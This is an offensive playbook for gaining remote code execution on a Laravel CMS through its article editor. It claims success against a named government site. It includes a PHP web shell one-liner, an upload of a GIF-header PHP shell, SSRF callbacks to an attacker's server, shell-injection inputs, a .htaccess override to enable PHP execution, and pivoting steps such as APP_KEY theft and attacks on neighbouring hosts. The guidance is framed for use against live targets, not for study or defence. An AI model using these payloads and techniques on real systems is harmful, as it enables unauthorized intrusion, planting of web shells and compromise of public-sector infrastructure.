# Authenticated CMS RCE — Article Editor Attack Surface

**Target class:** Laravel-based custom CMS with admin panel access
**Proven on:** nactvet.go.tz (2026-06-03)

## When You Have CMS Admin Access But No RCE

The CMS article editor (CKEditor or similar) is your PRIMARY attack surface. Do NOT spend
hours trying to bypass Apache storage blocks or file manager restrictions — use what you
already have: authenticated HTML/JS injection capability.

## CKEditor Feature Matrix — What To Try

| Feature | Payload | Expected Result | Reality on nactvet |
|---------|---------|----------------|-------------------|
| **Image → Upload** | GIF-header PHP shell | File lands in /storage/ | Apache blocks /storage/ (403) |
| **Image → URL tab** | `http://YOUR_VPS:PORT/test.png` | Server fetches & caches (SSRF) | NOT YET TESTED — do this FIRST |
| **Link → URL** | `file:///etc/passwd` | Local file inclusion | Client-side only, but check |
| **IFrame embed** | `<iframe src="http://127.0.0.1:3306">` | SSRF to internal services | NOT YET TESTED |
| **Source mode → Blade** | `@php system('id'); @endphp` | Server-side execution | ❌ REJECTED by server (HTTP 000) |
| **Source mode → PHP** | `<?php system('id'); ?>` | Server-side execution | ❌ REJECTED by server (HTTP 000) |
| **Source mode → SSTI** | `{{ 7*7 }}` | Server-side template injection | ❌ Rendered VERBATIM (no Blade eval) |
| **Source mode → Raw SSTI** | `{!! system('id') !!}` | Unescaped SSTI | ❌ Rendered VERBATIM (no Blade eval) |
| **Source mode → XSS** | `<script>fetch(...)</script>` | Client-side only | May work but not RCE |
| **Media Embed** | YouTube/Vimeo URL | Server-side fetch (SSRF?) | NOT YET TESTED |
| **Web-Setup Config** | `; id;` / `` `id` `` / `$(id)` | Shell injection via artisan | ❌ HTTP 500 — crash, no output |

## Key Findings

### Blade/SSTI is a DEAD END in DB-stored CMS content
Article content fetched from database is output with `{!! $content !!}` which does NOT
re-parse Blade directives. The content is treated as raw HTML. `{{ }}`, `{!! !!}`, and
`@php` directives all appear verbatim in the rendered page.

### PHP tags are REJECTED by Laravel middleware
Sending `<?php` or `@php` in POST data to article creation triggers HTTP 000 (connection
reset). Laravel's middleware detects and blocks PHP code in user input.

### Image URL (SSRF) is the MOST PROMISING untested vector
The CKEditor Image dialog has a URL tab. When an external URL is pasted, the server MAY:
1. Download and cache the image locally (potential file write to accessible dir)
2. Make an outbound HTTP request (SSRF to internal services)
3. Validate the image server-side (potential ImageMagick/GD exploit)

This should be tested BEFORE spending time on storage bypass.

## Workflow Priority (when stuck on Apache storage block)

1. **Image URL SSRF** → test with callback to your VPS
2. **IFrame/embed SSRF** → test internal service access
3. **Alternative upload forms** → profile, logo, slider, favicon (different dirs)
4. **APP_KEY extraction** → `.env` leak, DB access, config files
5. **Co-host pivot** → subdomain enumeration, weakest neighbor first
6. **Internal pivot** → if RCE exists on same-network host

## Pitfalls

### CSRF Tokens Are Session-Bound
Laravel CSRF tokens are cryptographically tied to the session. A token from session A
will ALWAYS return HTTP 419 when used with session B. Always GET the form page and
extract its CSRF token using the SAME cookie jar. Reusing tokens across sessions is
the #1 cause of wasted attempts.

### HTTP 500 on Web-Setup Form = Injection Point
The `modify_web_setting_configuration` endpoint calls Laravel artisan commands
(config:clear, config:cache). Shell metacharacters (`;`, `` ` ``, `$()`) in form
fields trigger HTTP 500 — the server crashes trying to execute the injected text
as a shell command. This confirms the injection reaches shell context. Try:
- `php artisan storage:link` — creates symlink from public/storage
- `php -r "file_put_contents('/var/www/html/public/s.php','<?php system($_GET[c]);?>');"`
The 500 response means execution happened but output isn't returned. Check side effects.

### .htaccess "Already Exists" is a FINDING Not a Failure
When LFM returns `"A file with this name already exists!"` for `.htaccess`, this means
an Apache access control file IS present in the upload directory. Instead of giving up:
1. READ the existing `.htaccess` via LFM download route
2. Analyze which rules are blocking PHP execution
3. Create a NEW subdirectory via LFM (`working_dir=/rce`)
4. Upload PHP shell + new `.htaccess` to the subdirectory
5. Subdirectory `.htaccess` overrides parent rules
This transforms "already exists" from a blocker into a capability.
